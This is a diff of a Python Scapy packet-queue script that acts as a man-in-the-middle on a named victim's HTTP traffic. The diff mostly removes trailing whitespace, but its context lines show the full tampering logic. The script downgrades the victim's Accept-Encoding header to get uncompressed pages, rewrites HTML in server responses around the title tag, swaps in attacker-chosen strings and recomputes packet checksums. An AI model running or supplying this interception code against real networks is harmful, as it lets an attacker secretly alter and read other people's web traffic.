@@ -10,15 +10,15 @@ import sys
 
 def callback(packet):
     # format the raw packet as a Scapy packet
-    pkt = IP(packet.get_payload()) 
-    
+    pkt = IP(packet.get_payload())
+
     ##########################################
-    # outgoing packets from victim to server 
+    # outgoing packets from victim to server
     if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[IP].src == vip:
-        
+
         # grab the TCP payload
         http_content = pkt[Raw].load
-        
+
         # change the 'Accept-Encoding: ' entry to identity
         # this requests an uncompressed version of the html page
         field = b'Accept-Encoding: '
@@ -26,7 +26,7 @@ def callback(packet):
         x = http_content.find(field)
         if x > 0:
             y = http_content.find(b'\r\n',x)
-            
+
             # grab the entry
             entry = http_content[x+size : y]
 
@@ -44,7 +44,7 @@ def callback(packet):
         size = len(field)
         x = http_content.find(field)
         if x > 0:
-            
+
             # check the first byte of the entry
             entry = http_content[x+size : x+size+1]
             # if it's not already 'c', change it to 'c'
@@ -55,7 +55,7 @@ def callback(packet):
             else:
                 http_content = http_content[:x+size] + b'1' + http_content[x+size+1:]
 
-        # update the payload with our modified payload 
+        # update the payload with our modified payload
         pkt[Raw].load = http_content
 
         # recompute checksums and IP length field
@@ -63,13 +63,13 @@ def callback(packet):
         del pkt[IP].len
         del pkt[IP].chksum
         pkt = pkt.__class__(raw(pkt)) # ty stack exchange <3
-    
- 
- 
- 
+
+
+
+
     # modify the response from the server
     if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].sport == 80 and pkt[IP].dst == vip:
-        
+
         # grab the TCP payload
         http_content = pkt[Raw].load
 
@@ -80,7 +80,7 @@ def callback(packet):
 	word = b'<title>'
         wordlen = len(word)
         x = http_content.find(word)
-        
+
         hook = b'Sausage'
         size = len(hook)
         if x > 0:
@@ -95,7 +95,7 @@ def callback(packet):
         size = len(field)
         x = http_content.find(field)
         if x > 0:
-            
+
             # check the second byte of the entry
             entry = http_content[x+size+1: x+size+2]
             # if it's not already 'a', change it to 'a'
@@ -106,30 +106,30 @@ def callback(packet):
                 http_content = http_content[:x+size+1] + b'2' + http_content[x+size+2:]
 
 
-        
-        # update the payload with our modified payload 
+
+        # update the payload with our modified payload
         pkt[Raw].load = http_content
-        
+
         # delete checksums and recompute
         del pkt[TCP].chksum
         del pkt[IP].len
         del pkt[IP].chksum
         pkt = pkt.__class__(raw(pkt)) # ty stack exchange <3
-        
-        
+
+
     # send the (modified) packet off
     packet.set_payload(raw(pkt))
     packet.accept()
-    
+
 def usage(program_name):
     print(f'usage:\t{program_name} <victim ip> <string to replace> <replacement string>')
     sys.exit(0)
-    
+
 if __name__ == '__main__':
-    
+
     if len(sys.argv) != 4:
         usage(sys.argv[0])
-    
+
     if (len(sys.argv[2]) != len(sys.argv[3])):
         print('Strings must be the same length.')
         sys.exit(0)
